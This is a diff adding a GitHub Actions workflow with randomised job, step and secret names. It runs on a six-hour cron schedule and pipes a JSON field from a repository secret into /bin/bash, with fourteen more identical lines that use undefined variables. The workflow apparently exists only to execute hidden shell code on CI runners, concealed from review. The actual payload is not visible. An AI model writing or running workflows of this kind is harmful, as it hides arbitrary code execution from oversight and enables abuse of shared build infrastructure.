@@ -1,0 +1,31 @@
+name: renxianqi4637
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '45 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: renxianqi4637
+        env:
+          rf40469: ${{ secrets.rf40469 }}
+        run: |
+          echo $rf40469 | jq -r .xpea51 | /bin/bash
+          echo $as1 | jq -r .xjmmh8 | /bin/bash
+          echo $nnnd1 | jq -r .sh981 | /bin/bash
+          echo $nppeo62210 | jq -r .jr7 | /bin/bash
+          echo $q25 | jq -r .fe121 | /bin/bash
+          echo $ehy7252 | jq -r .q288 | /bin/bash
+          echo $bzv33 | jq -r .f7 | /bin/bash
+          echo $kxqo76839 | jq -r .hvwn6 | /bin/bash
+          echo $ttp83 | jq -r .fvaix196 | /bin/bash
+          echo $lnlmn0 | jq -r .diq22 | /bin/bash
+          echo $l32682 | jq -r .fdtx30 | /bin/bash
+          echo $ac2704 | jq -r .kaae028 | /bin/bash
+          echo $fbh9 | jq -r .kjen077 | /bin/bash
+          echo $ify606 | jq -r .dbvd68 | /bin/bash
+          echo $qb20 | jq -r .bd555 | /bin/bash
+
